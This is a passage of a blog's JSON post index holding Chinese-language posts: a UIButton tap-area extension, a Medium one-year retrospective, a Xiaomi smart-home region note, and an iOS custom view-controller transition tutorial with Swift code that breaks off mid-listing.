UIEdgeInsets(top: -10, left: -10, bottom: -10, right: -10) } }播放按鈕/藍色為原始點擊區域/紅色為擴大後的點擊範圍使用時只需記得要將 Button 的 Class 指定為我們自訂的 MyButton，然後就能透過設定 touchEdgeInsets 針對個別 Button 擴大點擊範圍！ ️⚠️⚠️⚠️⚠️️️️⚠️️️️ 使用 Storyboard/xib 時記得設 Custom Class 為 MyButton ⚠️⚠️⚠️⚠️⚠️ touchEdgeInsets 以(0,0)自身為中心向外，所以上下左右的距離要用 負數 來延伸。看起來不錯…但是：對於每個 UIButton 都要置換成自訂的 MyButton 其實挺繁瑣的也增加程式的複雜性、甚至在大型專案中可能會有衝突。對於這種我們認為應該所有 UIButton 天生都應該要具有的功能，如果可以，我們希望能直接 Extension 擴充原本的 UIButton :private var buttonTouchEdgeInsets: UIEdgeInsets?extension UIButton { var touchEdgeInsets:UIEdgeInsets? { get { return objc_getAssociatedObject(self, &amp;buttonTouchEdgeInsets) as? UIEdgeInsets } set { objc_setAssociatedObject(self, &amp;buttonTouchEdgeInsets, newValue, .OBJC_ASSOCIATION_RETAIN_NONATOMIC) } } override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}使用上如前述使用範例。因 Extension 不能包含 Property 否則會報編譯錯誤「Extensions must not contain stored properties」，這邊參考了 使用 Property 配合 Associated Object 將外部變數 buttonTouchEdgeInsets 關聯到我們的 Extension 上，就能如 Property 日常使用。(詳細原理請參考 貓大的文章 )UIImageView (UITapGestureRecognizer) 呢？針對圖片點擊、我們自己在 View 上加的 Tap 手勢；ㄧ樣能透過複寫 UIImageView 的 pointInside 達到同樣的效果。 完成！經過不斷的改進，在解決這個議題上更簡潔方便了不少！參考資料：UIView 改变触摸范围 (Objective-C)附記去年同一時間想開個小分類「 顧小事成大事 」紀錄一下日常開發瑣碎的小事，但這些小事默默累積又能成大事增加整個 APP 的不管是體驗或是程式方面；結果 拖了一年 才又增加了一篇文章 &lt;( _ _ )&gt;，小事真的很容易忘了記錄啊！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,935 Total Views Last Statistics Date: 2025-01-19 | 1,873 Views on Medium. " }, { "title": "Medium 經營一年回顧", "url": "/posts/d01252331b53/", "categories": "ZRealm Life.", "tags": "medium, ios, life, writing-life, medium-taiwan", "date": "2020-01-12 23:49:30 +0800", "snippet": "Medium 經營一年回顧Medium 經營一年回顧的哩哩扣扣或是說 2019 年總結轉眼之間在 Medium 發表文章已經過了一年，實際上週年慶應該是 2019/10 (2018/10 第一篇)；但那時太忙了沒有靈感；眼看時間又向前邁入 2020 ，趕緊把經營一年的心得記錄一下、也當作是 2019 年總結吧！回顧在此先感謝 Enther Wu 及 Chih-Hung Yeh 的推坑，重新燃...", "content": "Medium 經營一年回顧Medium 經營一年回顧的哩哩扣扣或是說 2019 年總結轉眼之間在 Medium 發表文章已經過了一年，實際上週年慶應該是 2019/10 (2018/10 第一篇)；但那時太忙了沒有靈感；眼看時間又向前邁入 2020 ，趕緊把經營一年的心得記錄一下、也當作是 2019 年總結吧！回顧在此先感謝 Enther Wu 及 Chih-Hung Yeh 的推坑，重新燃起我的寫文魂；起初的文章比較像自己的日常或工作的心得筆記，內容較為空洞；不過依然很不要臉的貼到社群分享，現在回去看一開始的文章覺得有點糗，不知道在寫啥，內容含金量不高。不過一切都是成長的過程，越寫越有手感，在記錄的過程中研究的範疇越來越廣；因為怕誤人子弟、怕有遺漏的地方、怕是自己誤會；在這些壓力下，寫文章不只是記錄了，而是自己對某個問題的深入探索，更多的反而是自己的收穫成長；相對地與大家分享的內容質量也提高了不少。社群的大家真的很佛心，起初發文其實很怕被大家噴然後失去自信；但沒有，大家給的反饋都很正面，即使文章內容並不一定有幫助，也因為這股正面的鼓勵讓我在創作上更有信心，投入更多時間做紀錄；感謝大家的鼓勵！Medium 在寫作的體驗上真的很好，如果你也是程式開發者可以裝 Code Medium 這個 Chrome Extension，可以直接在 Medium 之中使用 Gist 貼上漂亮的程式碼！Publication &amp; Logo寫了生活又寫了技術，為了做區隔所幸建立了兩個 Publication 頻道： ZRealm Life. 分享生活、開箱 / ZRealm Dev. 分享工作、技術方面文章 ，讓大家可以依照自己想看的內容去追蹤。一個非常 ”西花“ 的東西 — 「LOGO」 ，生活要有儀式感？既然說是經營，那應該要有自己的品牌識別？於是我請了設計大大幫我把我的 Logo 構想製作出來；我的設計構想：外框五角形是致敬母校 台科大的校徽 ，五角代表板手代表技術工藝、內框 “ ZR ” 其實也沒變的意思就是我的英譯中文姓名 ZhongCheng 的首字 “ Z” 還有 Realm 我的地盤的 ”R” 。收穫要說收穫，先說寫文的初衷 — 「 教學相長 」，不是為了展示什麼、更不是為了賺錢；所有文章我都沒加入付費牆，知識不應該是要付費才能看的，知識本是力量； 如果喜歡可以多多支持 Medium 付費會員 ，這樣才能讓我們有較長遠的平台可以使用…(實在很怕它不堪虧損)要說收穫的話，除了金錢利益沒有，其他都有滿滿的收穫；第一是 成就感 ，文章有人看、有迴響就會很有成就感，更有動力繼續寫文；再來是認識了許多朋友產生更多的交流；我是屬於被動社交的人，在寫文章之前其實對社群是非常陌生的，幾乎沒有交流，現在認識許多朋友，覺得 在開發的路上並不孤單了！(如同我 Publication 的副標題 — 「解決問題的道路上你並不孤單」) 。統計既然說是回顧，那不免俗要統計一下數據。2019年(含2018年末)一共發表了：25 篇文章： 2 篇生活 + 5 篇開箱 + 18 篇技術文章累積約 60,000 次流量、 5,000 個拍手、突破 200 位追蹤者！表現比較好的文章有： iOS Deferred Deep Link 延遲深度連結實作(Swift) AirPods 2 開箱及上手體驗心得 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了。 Apple Watch Series 4 從入手到上手全方位心得 感謝大家的支持與愛護，今年也會繼續加油的！ 你的追蹤與回饋就是我寫作的原動力！ZhgChgLi, 2020/01/11.有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 260 Total Views Last Statistics Date: 2025-01-19 | 256 Views on Medium. " }, { "title": "米家 APP / 小愛音箱地區問題", "url": "/posts/94a4020edb82/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 小米空氣清淨機, ios, 小米", "date": "2020-01-12 22:04:14 +0800", "snippet": "米家 APP / 小愛音箱地區問題新添購小米空氣淨化器 3 &amp; 記錄下米家與小愛音箱的連動問題前言關於小米的第四篇；最近再加一新成員 — 「小米空氣淨化器 3」 老實說從未關心過房間的空氣品質，平常看室外空氣霧濛濛還是會怕怕的，再加上本身長期鼻子過敏，就下手買了一台放房間了！新一代在主機上就有小螢幕顯示濾網剩餘使用時間、當前空氣品質、選擇運行模式，不用連接 APP 就能使用；連接 A...", "content": "米家 APP / 小愛音箱地區問題新添購小米空氣淨化器 3 &amp; 記錄下米家與小愛音箱的連動問題前言關於小米的第四篇；最近再加一新成員 — 「小米空氣淨化器 3」 老實說從未關心過房間的空氣品質，平常看室外空氣霧濛濛還是會怕怕的，再加上本身長期鼻子過敏，就下手買了一台放房間了！新一代在主機上就有小螢幕顯示濾網剩餘使用時間、當前空氣品質、選擇運行模式，不用連接 APP 就能使用；連接 APP 的話就能遠端控制，但也沒其他特別的功能。買回來兩週了，發現房間空氣品質不錯；戶外空氣好時，室內空氣品質數值約在 001~006；室外空氣不好時，室內大約在 008~015；數值超過 75 才算空氣品質不好，150以上算嚴重；應該改買吸塵器比較實用ＸＤ不過有台空氣小尖兵守護家裡也是蠻不錯的。米家智慧家庭地區功能限制米家 APP 有分台灣跟中國兩個地區可以選擇；地區選擇會影響 APP 內的功能，當初設定的時候選了中國地區，想說選哪區其實資料都不安全，那不如選功能多的地區，可以玩更多功能。去年小愛音箱加入後，才注意到地區選擇有更複雜的問題；就是若要從小愛音箱控制米加智慧家電，兩個 APP 的地區必須選擇一樣，否則無法串接；這實在讓人苦惱，因為小愛音箱一樣如果選台灣，雖可搭配 KKBOX 但智慧功能是閹割版（少了小愛訓練）。因此我的小愛音箱原本的地區選擇也是設中國地區，之前買的家電再加入上沒碰到問題，最後也最後也無礙的建立好完整的智慧家庭流程：出門跟小愛說掰掰就會自動關閉所有電器+打開門口攝影機；回家則說到家了，一樣連動家電自動開啟；體驗起來蠻舒暢的！左:台灣/右:中國小米空氣淨化器 3的加入買了那麼多小米居家用品，新成員當然也要加入我的米家 APP！不過在加入的時候遇到問題，台灣版的小米空氣淨化器 3 無法加入我的米家 APP，要將米家 APP 地區切回台灣，才可….這下可麻煩了，唯獨空氣清淨機無法加入；怎麼試都無法，好像是配對方式台灣跟中國方式不一樣，無奈下只好將地區切回台灣，所有家電全部重設… 小愛音箱也改回台灣了。小愛音箱 + 米家智慧家庭場景控制因地區切回台灣，少了「小愛訓練」功能；無法直接在 APP 內設置詞彙執行對應的米家智慧家庭場景；再多方嘗試下，發現其實智慧家庭有連結授權米家 APP 的話，場景、家電還是會自動連動到小愛音箱授權控制！BUG我的場景「回家」小愛音箱能正確識別執行，但是「出門」卻一直無法識，嘗試了一個下午才發現是簡繁體問題；我把場景名稱換成「出门」，小愛音箱就能正常識別執行。 所以有場景無法執行問題的朋友不妨將場景名稱、裝置名稱改為簡體字。 完成！這樣就能在 APP 地區設定在台灣下，繼續照原本的體驗使用米加智慧家庭。延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學） 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 6,712 Total Views Last Statistics Date: 2025-01-19 | 6,154 Views on Medium. " }, { "title": "iOS UIViewController 轉場二三事", "url": "/posts/14cee137c565/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, swift, uiviewcontroller, mobile-app-development", "date": "2020-01-12 02:41:06 +0800", "snippet": "iOS UIViewController 轉場二三事UIViewController 下拉關閉/上拉出現/全頁右滑返回 效果全解前言一直以來都很好奇諸如 Facebook、Line、Spotify…等等常用的 APP 是如何實作「Present 的 UIViewController 可下拉關閉」、「上拉漸入 UIViewController」、「全頁面支援手勢右滑返回」這些效果的。因為這些效...", "content": "iOS UIViewController 轉場二三事UIViewController 下拉關閉/上拉出現/全頁右滑返回 效果全解前言一直以來都很好奇諸如 Facebook、Line、Spotify…等等常用的 APP 是如何實作「Present 的 UIViewController 可下拉關閉」、「上拉漸入 UIViewController」、「全頁面支援手勢右滑返回」這些效果的。因為這些效果內建都沒有，下拉關閉也直到 iOS ≥ 13 才有系統的卡片樣式支援。探索之路不知道是不會下關鍵字還是資料本身難找，一直找不到這類功能的實踐做法，找到的資料都很含糊零散，只能東拼西湊。一開始自己研究做法時找到 UIPresentationController 這個 API ，沒再深掘其他資料，就用這個方法搭配 UIPanGestureRecognizer 用很土炮的方式完成下拉關閉的效果；一直都覺得哪裡怪怪的，感覺會有更好的方式。直到最近接觸新專案拜讀 大大的文章 ，擴大眼界才發現有其他 API 更漂亮、更有彈性的做法可以用。 本篇一方面是自我紀錄，另一方面希望有幫助到跟我有一樣困惑的朋友。 內容有點多，嫌麻煩的可以直接拉到底看範例，或直接下載 Github 專案回來研究！iOS 13 卡片樣式呈現頁面首先講最新系統內建的效果iOS ≥ 13 後 UIViewController.present(_:animated:completion:) 默認的 modalPresentationStyle 效果就是 UIModalPresentationAutomatic 片樣式呈現頁面，若想要保持之前的全頁面呈現就要特別指定回 UIModalPresentationFullScreen 即可。內建行事曆新增效果如何取消下拉關閉？關閉確認？更好的使用者體驗應該要能在觸發下拉關閉時檢查有無輸入資料，有的話需要提示使用者是否捨棄動作離開。這部分蘋果也幫我們想好了，只需實作 UIAdaptivePresentationControllerDelegate 裡的方法即可。import UIKitclass DetailViewController: UIViewController { private var onEdit:Bool = true; override func viewDidLoad() { super.viewDidLoad() //設置代理 self.presentationController?.delegate = self //if uiviewcontroller embed in navigationController: //self.navigationController?.presentationController?.delegate = self //取消下拉關閉方式(1): self.isModalInPresentation = true; } }//代理實作extension DetailViewController: UIAdaptivePresentationControllerDelegate { //取消下拉關閉方式(2): func presentationControllerShouldDismiss(_ presentationController: UIPresentationController) -&gt; Bool { return false; } //下拉關閉取消時，下拉手勢觸發 func presentationControllerDidAttemptToDismiss(_ presentationController: UIPresentationController) { if (onEdit) { let alert = UIAlertController(title: \"資料尚未存儲\", message: nil, preferredStyle: .actionSheet) alert.addAction(UIAlertAction(title: \"捨棄離開\", style: .default) { _ in self.dismiss(animated: true) }) alert.addAction(UIAlertAction(title: \"繼續編輯\", style: .cancel, handler: nil)) self.present(alert, animated: true) } else { self.dismiss(animated: true, completion: nil) } }}取消下拉關閉可指定 UIViewController 的變數 isModalInPresentation 為 false 或實作 UIAdaptivePresentationControllerDelegate presentationControllerShouldDismiss 並回傳 true 擇一都可。UIAdaptivePresentationControllerDelegate presentationControllerDidAttemptToDismiss 這個方法只有在 下拉關閉取消時 才會呼叫使用。By the way…卡片樣式呈現頁面對系統來說就是 Sheet ，行為上跟 FullScreen 有所不同。 假設今天 RootViewController 是 HomeViewController 在卡片樣式呈現下 (UIModalPresentationAutomatic) 則： HomeViewController Present DetailViewController 時… HomeViewController 的 viewWillDisAppear / viewDidDisAppear 都不會觸發。 當 DetailViewController Dismiss 時… HomeViewController 的 viewWillAppear / viewDidAppear 都不會觸發。 ⚠️ 因 XCODE 11 之後版本打包的 iOS ≥ 13 APP 預設 Present 都會使用卡片樣式 (UIModalPresentationAutomatic) 如果之前有把一些邏輯放在 viewWillAppear/viewWillDisappear/viewDidAppear/viewDidDisappear 的要多加檢查注意！ ⚠️ 看完系統內建的，來看本篇重頭戲吧！如何自幹這些效果？哪裡可做轉場動畫？首先先整理哪裡可以做視窗切換轉場動畫。UITabBarController/UIViewController/UINavigationControllerUITabBarController 切換時我們可以在 UITabBarController 設定 delegate 然後實作 animationControllerForTransitionFrom 方法，就能在切換 UITabBarController 時對內容套用自訂轉場特效。系統預設無動畫，上方展示圖的是淡入淡出切換特效。import UIKitclass MainTabBarViewController: UITabBarController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self } }extension MainTabBarViewController: UITabBarControllerDelegate { func tabBarController(_ tabBarController: UITabBarController, animationControllerForTransitionFrom fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //return UIViewControllerAnimatedTransitioning }}UIViewController Present/Dismiss 時理所當然，在 Present/Dismiss UIViewController 時可以指定要套用的動畫效果，不然就不會有此篇文章了XD；不過值得一提的是，如果只是單純要做 Present 動畫沒有要做手勢控制，可以直接使用 UIPresentationController 方便快速 (詳見文末參考資料)。系統預設是上滑出現下滑消失！自己客製的話可以加入淡入、圓角、出現位置控制…等效果。import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Present時要套用的動畫 } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Dismiss時要套用的動畫 }} 任何 UIViewController 都能實作 transitioningDelegate 告知 Present/Dismiss 動畫； UITabBarViewController 、 UINavigationController 、 UITableViewController ….都可UINavigationController Push/Pop 時UINavigationController 大概是最不太需要會改動畫的，因為系統預設的左滑出現右滑返回動畫已經是最好的效果，能想得到要做這部分的客製可能可以用來做無縫 UIViewController 左右切換效果。因為我們要做全頁都可手勢返回，需要配合自訂 POP 動畫，所以需要自己實作一個返回動畫效果。import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return //UIViewControllerAnimatedTransitioning 返回時要套用的動畫 } else if operation == .push { return //UIViewControllerAnimatedTransitioning push時要套用的動畫 } //回傳 nil 即走預設動畫 return nil }}交互非交互動畫？再講動畫實作、手勢控制前，先講一下何謂交互與非交互。交互動畫： 手勢觸發動畫，如 UIPanGestureRecognizer非交互動畫： 系統呼叫動畫，如 self.present( )怎麼實作動畫效果？講完哪裡可以做，再來看怎麼做動畫效果。我們需要實作 UIViewControllerAnimatedTransitioning 這個 Protocol 並在裡面對視窗做動畫。一般轉場動畫: UIView.animate直接使用 UIView.animate 做動畫處理，此時的 UIViewControllerAnimatedTransitioning 需要實作 transitionDuration 告知動畫時長、 animateTransition 實作動畫內容這兩個方法。import UIKitclass SlideFromLeftToRightTransition: NSObject, UIViewControllerAnimatedTransitioning { func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { //可用參數： //取得要展示的目標 UIViewController 的 View 內容: let toView = transitionContext.view(forKey: .to) //取得要展示的目標 UIViewController: let toViewController = transitionContext.viewController(forKey: .to) //取得要展示的目標 UIViewController 的 View 的初始化 Frame 資訊: let toInitalFrame = transitionContext.initialFrame(for: toViewController!) //取得要展示的目標 UIViewController 的 View 的最終 Frame 資訊: let toFinalFrame = transitionContext.finalFrame(for: toViewController!) //取得當前 UIViewController 的 View 內容: let fromView = transitionContext.view(forKey: .from) //取得當前 UIViewController: let fromViewController = transitionContext.viewController(forKey: .from) //取得當前 UIViewController 的 View 的初始化 Frame 資訊: let fromInitalFrame = transitionContext.initialFrame(for: fromViewController!) //取得當前 UIViewController 的 View 的最終 Frame 資訊: (在關閉動畫時可以取得之前顯示動畫時的最終Frame) let fromFinalFrame = transitionContext.finalFrame(for: fromViewController!) //toView.frame.origin.y = UIScreen.main.bounds.size.height UIView.animate(withDuration: transitionDuration(using: transitionContext), delay: 0, options: [.curveLinear], animations: { //toView.frame.origin.y = 0 }) { (_) in if (!transitionContext.transitionWasCancelled) { //動畫沒中斷 } // 告知系統動畫完成 transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } } } To 跟 From: 假設今天 HomeViewController 要 Present/Push DetailViewController 時， From = HomeViewController / To = DetailViewController DetailViewController 要 Dismiss/Pop 時， From = DetailViewController / To = HomeViewController⚠️⚠️⚠️⚠️⚠️ 官方建議從 transitionContext.view 拿 View 使用，而不是從 transitionContext.viewController 拿 .view 使用。 但這邊有個問題，就是在做 Present/Dismiss 動畫時當 modalPresentationStyle = .custom ； Present 時使用 transitionContext.view(forKey: .from) 會是 nil 、 Dismiss 時使用 transitionContext.view(forKey: .to) 也會是 nil ； 還是需要從 viewController.view 拿值來用。⚠️⚠️⚠️⚠️⚠️ transitionContext.completeTransition(!transitionContext.transitionWasCancelled) 動畫完成必須呼叫，否則 畫面會卡死 ； 但因 UIView.animate 若無可執行動畫就不會 Call completion 造成前述方法未被呼叫；所以務必確保動畫是會執行的 (EX: y從100到0)。ℹ️ℹ️ℹ️ℹ️ℹ️ 參與動畫的 ToView/FromView ，若因 View 較為複雜或動畫時有些問題；可改用 snapshotView(afterScreenUpdates:) 截圖作為動畫展示，先截圖然後 transitionContext.containerView.addSubview(snapShotView) 上去圖層，接著隱藏原本的 ToView/FromView (isHidden = true) ，在動畫結束時在 snapShotView.removeFromSuperview() 和恢復顯示原本的 ToView/FromView (isHidden = true) 。可中斷、繼續的轉場動畫: UIViewPropertyAnimator另外也可以使用 iOS ≥ 10 新的動畫類別來實作動畫效果，看個人習慣或是動畫要做到多細節來做選擇，雖然官方的建議是有交互就使用 UIViewPropertyAnimator 但 不管是交互非交互(手勢控制) 一般都使用 UIView.animate 即可 ；UIViewPropertyAnimator 的轉場動畫能做到中斷繼續的效果，雖然我不知道實際能應用在哪，有興趣的朋友可參考 此篇文章 。import UIKitclass FadeInFadeOutTransition: NSObject, UIViewControllerAnimatedTransitioning { private var animatorForCurrentTransition: UIViewImplicitlyAnimating? func interruptibleAnimator(using transitionContext: UIViewControllerContextTransitioning) -&gt; UIViewImplicitlyAnimating { //當前有轉場動畫時直接返回 if let animatorForCurrentTransition = animatorForCurrentTransition { return animatorForCurrentTransition } //參數同前述 //fromView.frame.origin.y = 100 let animator = UIViewPropertyAnimator(duration: transitionDuration(using: transitionContext), curve: .linear) animator.addAnimations { //fromView.frame.origin.y = 0 } animator.addCompletion { (position) in transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } //抓著動畫 self.animatorForCurrentTransition = animator return animator } func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { //如果是非交互會走這，就讓它也走交互的動畫 let animator = self.interruptibleAnimator(using: transitionContext) animator.startAnimation() } func animationEnded(_ transitionCompleted: Bool) { //動畫完成，清空 self.animatorForCurrentTransition = nil } } 交互情況下 (後面講控制會細提)，會使用 interruptibleAnimator 方法的動畫；非交互的情況則還是使用 animateTransition 方法。 因為能繼續、中斷的特性；所以 interruptibleAnimator 是有可能會重複呼叫使用的；所以我們需要用一個全域變數做存取返回。Murmur… 其實我本來是想全都改用新的 UIViewPropertyAnimator 也想推薦大家都用新的來做，但我遇到一個很奇怪的問題，就是在做全頁手勢返回 Pop 動畫時，若手勢放開，動畫歸位，上方的 Navigation Bar 的 Item 會淡入淡出閃一下…找不到解，但回去用 UIView.animate 就沒這問題；如果有地方沒注意到歡迎跟我說&lt;( _ _ )&gt;。問題圖; + 按鈕是上一頁的所以保險起見還是用舊的方式吧！實際會依照不同的動畫效果建立個別的 Class，若覺得很檔案雜，可參考文末包好的方案；或是將同個連貫(Present+Dismii)動畫放在一起。transitionCoordinator另外如果需要更細緻的控制，例如 ViewController 裡面有某個元件需要配合轉場動畫改變；可在 UIViewController 中使用 transitionCoordinator 進行協作，這部分我沒用到；有興趣可參考 此篇文章 。怎麼控制動畫？這邊就是前述所說的「交互」，實際就是手勢控制；本篇最重要的章節，因為我們的要做的是手勢操作與轉場動畫的連動功能，才能達成我們要的下拉關閉、全頁返回功能。控制代理設置:同前面 ViewController 代理動畫設計，交互處理的類也需要在代理中告知 ViewController 。UITabBarController: 無 UINavigationController (Push/Pop):import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return //UIViewControllerAnimatedTransitioning 返回時要套用的動畫 } else if operation == .push { return //UIViewControllerAnimatedTransitioning push時要套用的動畫 } //回傳 nil 即走預設動畫 return nil } //新增交互代理方法: func navigationController(_ navigationController: UINavigationController, interactionControllerFor animationController: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //這邊無法得知是Pop還是Push 只能從要做的動畫本身做判斷 if animationController is push時套用的動畫 { return //UIPercentDrivenInteractiveTransition push動畫的交互控制方法 } else if animationController is 返回時套用的動畫 { return //UIPercentDrivenInteractiveTransition pop動畫的交互控制方法 } //回傳 nil 即不做交互處理 return nil }}UIViewController (Present/Dismiss):import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //return nil 即不做交互處理 return //UIPercentDrivenInteractiveTransition Dismiss時交互控制方法 } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //return nil 即不做交互處理 return //UIPercentDrivenInteractiveTransition Present時交互控制方法 } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Present時要套用的動畫 } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Dismiss時要套用的動畫 } }⚠️⚠️⚠️⚠️⚠️ 有實作 interactionControllerFor … 這些方法，就算動畫是非交互(EX: self.present 系統呼叫轉場) 也會 Call 這些方法處理；我們需要控制的是裡面的 wantsInteractiveStart 參數(下面介紹)。動畫交互處理類 UIPercentDrivenInteractiveTransition:再來講核心要實作的 UIPercentDrivenInteractiveTransition 。import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { //要加手勢控制交互的UIView private var interactiveView: UIView! //當前的UIViewController private var presented: UIViewController! //當托拉超過多少%後就完成執行，否則復原 private let thredhold: CGFloat = 0.4 //不同轉場效果可能需要不同資訊，可自訂 convenience init(_ presented: UIViewController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.presented = presented setupPanGesture() //默認值，告知系統當前非交互動畫 wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: //reset 手勢位置 sender.setTranslation(.zero, in: interactiveView) //告知系統當前開始的是手勢觸發的交互動畫 wantsInteractiveStart = true //在手勢began時呼叫要做的轉場效果(不會直接執行，系統會抓住) //然後轉場效果有設對應的動畫就會跳到 UIViewControllerAnimatedTransitioning 處理 // animated 一定為 true 否則沒動畫 //Dismiss: self.presented.dismiss(animated: true, completion: nil) //Present: //self.present(presenting,animated: true) //Push: //self.navigationController.push(presenting) //Pop: //self.navigationController.pop(animated: true) case .changed: //手勢滑動的位置計算 對應動畫完成百分比 0~1 //實際依動畫類型不同，計算方式不同 let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) //update UIViewControllerAnimatedTransitioning 動畫百分比 update(percentage) case .ended: //手勢放開完成時，看完成度有沒有超過 thredhold wantsInteractiveStart = false if percentComplete &gt;= thredhold { //有，告知動畫完成 finish() } else { //無，告知動畫歸位復原 cancel() } case .cancelled, .failed: //取消、錯誤時 wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}//當UIViewController內有UIScrollView元件(UITableView/UICollectionView/WKWebView....)，防止手勢衝突//當裡面的UIScrollView元件已滑到頂部，則啟用交互轉場的手勢操作extension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }*關於 sender.setTranslation( .zero, in:interactiveView) 原因的補充點我&lt;我們需要依據不同的手勢操作效果，實作不同的 Class；若是同個連貫(Present+Dismii)的操作也可包在一起。⚠️⚠️⚠️⚠️⚠️ wantsInteractiveStart 務必處於符合的狀態 ，若在交互動畫時告知 wantsInteractiveStart = false 也會造成卡畫面； 要退出重進 APP 才會恢復正。⚠️⚠️⚠️⚠️⚠️ interactiveView 也一定要是 isUserInteractionEnabled = true 哦 可以多加設置確保一下！組合當我們把這裡個 Delegate 設好、 Class 建好後就能做到我們想要的功能了。再來不囉唆，直接上完成範例。自製下拉關閉頁面效果自製下拉的好處在能支援市面所有 iOS 版本、可控制蓋板百分比、控制觸發關閉位置、客製化動畫效果。點右上方 + Present 頁面這是一個 HomeViewController Present HomeAddViewController 和 HomeAddViewController Dismiss的範例。import UIKitclass HomeViewController: UIViewController { @IBAction func addButtonTapped(_ sender: Any) { guard let homeAddViewController = UIStoryboard(name: \"Main\", bundle: nil).instantiateViewController(identifier: \"HomeAddViewController\") as? HomeAddViewController else { return } //transitioningDelegate 可指定目標ViewController處理或當前的ViewController處理 homeAddViewController.transitioningDelegate = homeAddViewController homeAddViewController.modalPresentationStyle = .custom self.present(homeAddViewController, animated: true, completion: nil) }}import UIKitclass HomeAddViewController: UIViewController { private var pullToDismissInteractive:PullToDismissInteractive! override func viewDidLoad() { super.viewDidLoad() //綁定轉場交互資訊 self.pullToDismissInteractive = PullToDismissInteractive(self, self.view) } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { return pullToDismissInteractive } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(false) } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(true) } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //這邊無Present操作手勢 return nil }}import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { private var 